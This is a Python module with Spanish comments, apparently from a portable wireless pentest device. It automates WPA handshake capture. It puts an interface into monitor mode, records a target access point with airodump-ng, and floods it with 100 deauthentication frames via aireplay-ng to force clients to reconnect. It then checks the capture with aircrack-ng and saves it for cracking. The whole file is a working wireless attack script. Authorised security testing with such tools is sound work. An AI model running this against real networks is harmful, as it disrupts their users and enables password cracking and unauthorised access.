# /opt/beetle/tools/wifi/aireplay_runner.py
#aireplay_runner.py

import subprocess
import time
import os
import signal
import sys
from display.screen import MenuDisplay

# --- Configuración ligera/constantes ---
IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]
AIRODUMP = "airodump-ng"
AIREPLAY = "aireplay-ng"
AIRCRACK = "aircrack-ng"
DEFAULT_DEAUTH_COUNT = "100"
AIRODUMP_START_DELAY = 4.0    # segundos para que airodump arranque en Pi Zero
POST_CAPTURE_WAIT = 8.0       # espera después de aireplay para asegurarse que se vuelquen datos
AIREDURATION_LIMIT = 30       # tiempo máximo en segundos para ejecutar aireplay (por seguridad)

# --- Variables de control global para manejo de procesos y estado ---
_child_procs = []
_interrupted = False
_brought_up_by_script = False

# --- Utilidades ---
def run_cmd(cmd, stdout=None, stderr=None, text=True, check=False, timeout=None):
    return subprocess.run(cmd, stdout=stdout, stderr=stderr, text=text, check=check, timeout=timeout)

def check_command_exists(name):
    try:
        subprocess.run(["which", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def iface_is_up(iface=IFACE):
    try:
        res = subprocess.run(["ip", "-o", "link", "show", iface],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if res.returncode != 0:
            return False
        out = res.stdout.lower()
        return ("state up" in out) or ("<up" in out)
    except Exception:
        return False

def _run_mon_cmd(cmd, timeout=4.0):
    """Ejecuta sudo mon0up/mon0down y devuelve (rc, stdout, stderr)."""
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)

def bring_mon0_up(display=None):
    """Levanta mon0 usando `sudo mon0up`. Retorna True si quedó UP."""
    
    try:
        rc, out, err = _run_mon_cmd(MON_UP_CMD)
    except Exception:
        rc, out, err = -1, "", "exception"

    # Si el comando devuelve un error conocido (ej: Operation not supported) no lo tratamos como fatal.
    if rc != 0:
        combined = (out or "") + (err or "")
        if "Operation not supported" in combined or "operation not supported" in combined:
            # no fatal, seguir a comprobación por ip/sys
            pass
        # otros errores se ignoran en la medida de lo posible; seguimos comprobando existencia
    # esperar un poco y comprobar varias veces
    for _ in range(10):
        if iface_is_up(IFACE) or os.path.isdir(f"/sys/class/net/{IFACE}"):
            return True
        time.sleep(0.4)
    return False

def bring_mon0_down(display=None):
    """Baja mon0 usando `sudo mon0down`. Sólo este método se usa para bajar el monitor."""
    if display:
        display.show_message([" Bajando mon0... "], center=True)
    try:
        rc, out, err = _run_mon_cmd(MON_DOWN_CMD)
    except Exception:
        rc, out, err = -1, "", "exception"

    combined = (out or "") + (err or "")
    # Si el comando indica que no existe el dispositivo, consideramos que ya está abajo -> OK.
    if "device \"mon0\" does not exist" in combined.lower() or "no such device" in combined.lower():
        if display:
            display.show_message([" mon0 bajada "], center=True)
        return True

    # breve espera y comprobar
    time.sleep(0.5)
    if not iface_is_up(IFACE) and not os.path.isdir(f"/sys/class/net/{IFACE}"):
        if display:
            display.show_message([" mon0 bajada "], center=True)
        return True
    else:
        if display:
            display.show_message([" mon0 sigue UP "], center=True)
      
        return False

def _terminate_child_procs():
    """Termina procesos hijos abiertos (airodump/aireplay) de forma segura."""
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=2)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs.clear()

def _signal_handler(signum, frame):
    """Manejo de SIGINT/SIGTERM -> intento terminar limpio y bajar mon0 con mon0down."""
    global _interrupted
    _interrupted = True
    # intentar detener procesos
    try:
        _terminate_child_procs()
    except Exception:
        pass
    # intentar bajar mon0 
    try:
        bring_mon0_down(display=None)
    except Exception:
        pass
    # salir con código de señal
    sys.exit(1)

# Registrar manejadores de señal
signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# --- Función principal ---
def run_aireplay(ssid, bssid, channel, client_mac=None):
    """
    Ejecuta airodump-ng y aireplay-ng para capturar handshake.
    Verifica si el handshake fue capturado con éxito.
    Guarda logs y .cap en reports/wifi.
    """
    global _brought_up_by_script, _interrupted
    display = MenuDisplay()

    # Validar availability de comandos esenciales (no interrumpir si no existen)
    for cmd in (AIRODUMP, AIREPLAY, AIRCRACK):
        if not check_command_exists(cmd):
            display.show_message([f"{cmd} no encontrado", "Instalalo primero"], center=True)
            time.sleep(2)
            return None

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/wifi"))
    os.makedirs(folder, exist_ok=True)

    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-_'))
    cap_prefix = os.path.join(folder, f"handshake_{safe_ssid}_{timestamp}")
    cap_file = f"{cap_prefix}-01.cap"
    log_file = os.path.join(folder, f"aireplay_{safe_ssid}_{timestamp}.log")

    # Mostrar inicialmente que vamos a ejecutar aireplay (igual que el original)
    display.show_message([f"AIREPLAY:", f"{ssid}", "Iniciando captura..."], center=True)
    time.sleep(0.6)

    # Asegurar que mon0 esté UP (usar siempre mon0 y levantarla con sudo mon0up si hace falta)
    was_up_before = iface_is_up(IFACE)
    if not was_up_before:
        ok = bring_mon0_up(display)
        if not ok:
            # en caso de fallo al levantar, mostramos mensaje de error y salimos
            display.show_message(["No se pudo levantar", "mon0"], center=True)
            time.sleep(2)
            return None
        _brought_up_by_script = True
       
    else:
       
        pass

    # Preparar comando airodump-ng (usa mon0 explícitamente)
    airodump_cmd = [
        "sudo", AIRODUMP,
        "-c", str(channel),
        "--bssid", bssid,
        "-w", cap_prefix,
        IFACE
    ]

    # Lanzar airodump-ng
    try:
        airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _child_procs.append(airodump_proc)
    except Exception:
        display.show_message(["Error iniciando", "airodump-ng"], center=True)
        # intentar cleanup
        _terminate_child_procs()
        if _brought_up_by_script:
            bring_mon0_down(display)
        return None

    # esperar que airodump arranque
    time.sleep(AIRODUMP_START_DELAY)

    # Preparar comando aireplay-ng
    aireplay_cmd = [
        "sudo", AIREPLAY,
        "--deauth", DEFAULT_DEAUTH_COUNT,
        "-a", bssid,
        IFACE
    ]
    if client_mac:
        aireplay_cmd.extend(["-c", client_mac])

    # Ejecutar aireplay-ng y loguear su salida
    try:
        with open(log_file, "w") as log:
            aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=log, stderr=subprocess.STDOUT, text=True)
            _child_procs.append(aireplay_proc)

            start = time.time()
            # IMPORTANTE: NO actualizamos la UI durante la ejecución. La pantalla queda fija
            # mostrando el mensaje inicial hasta que se llegue al bloque de Mensaje final en pantalla.
            while aireplay_proc.poll() is None:
                if _interrupted:
                    # si hubo interrupción desde signal handler, intentar terminar
                    try:
                        aireplay_proc.terminate()
                    except Exception:
                        pass
                    break
                if time.time() - start > AIREDURATION_LIMIT:
                    # seguridad: si dura demasiado, terminar
                    try:
                        aireplay_proc.terminate()
                    except Exception:
                        pass
                    break
                time.sleep(0.4)
    except Exception:
        display.show_message(["Error ejecutando", "aireplay-ng"], center=True)
        # intentar cleanup
        _terminate_child_procs()
        if _brought_up_by_script:
            bring_mon0_down(display)
        return None

    # Dar tiempo para que los paquetes se escriban en el .cap
    time.sleep(POST_CAPTURE_WAIT)

    # Terminar airodump-ng de forma ordenada
    try:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=4)
            except subprocess.TimeoutExpired:
                try:
                    airodump_proc.kill()
                except Exception:
                    pass
    except Exception:
        pass
    finally:
        # limpiar lista de procesos
        _child_procs[:] = [p for p in _child_procs if p.poll() is None]

    # Verificar existencia y tamaño mínimo del .cap
    cap_ok = os.path.isfile(cap_file) and os.path.getsize(cap_file) > 10000

    # Verificar handshake usando aircrack-ng (salida stdout)
    has_handshake = False
    if cap_ok:
        try:
            verify_cmd = [AIRCRACK, cap_file]
            result = subprocess.run(verify_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=12)
            out = (result.stdout or "") + (result.stderr or "")
            has_handshake = "handshake" in out.lower()
        except Exception:
            display.show_message(["Error al verificar", "con aircrack-ng"], center=True)
            time.sleep(1.5)

    # ---- Mensaje final en pantalla (aquí actualizamos por primera vez desde el inicio) ----
    if has_handshake:
        display.show_message(["Handshake capturado", "correctamente"], center=True)
    elif cap_ok:
        display.show_message([".cap generado pero", "sin handshake"], center=True)
    else:
        display.show_message(["Error: .cap no válido", "Archivo vacío o corrupto"], center=True)

    time.sleep(2.2)
    # ---------------------------------------------------------------------------

    # Si todo salió correctamente (o al menos llegamos al final sin excepción), bajar mon0
    # Según pedido: la bajada se hace solamente con `sudo mon0down`.
    try:
        # sólo intentar bajar si el script fue quien la levantó (evitar bajar si ya estaba UP antes)
        if _brought_up_by_script:
            bring_mon0_down(display)
    except Exception:
        # no interrumpir el flujo por errores en cleanup; mostramos un mensaje y seguimos
        display.show_message([" Error bajando mon0 "], center=True)
        time.sleep(1)

    # devolver el path si existe (aunque no tenga handshake)
    return cap_file if os.path.isfile(cap_file) else None

# Si se llama al script directamente (testing), ejemplo de uso mínimo:
if __name__ == "__main__":
   
    print("Este módulo está pensado para ser importado y usar run_aireplay(ssid, bssid, channel, client_mac=None).")
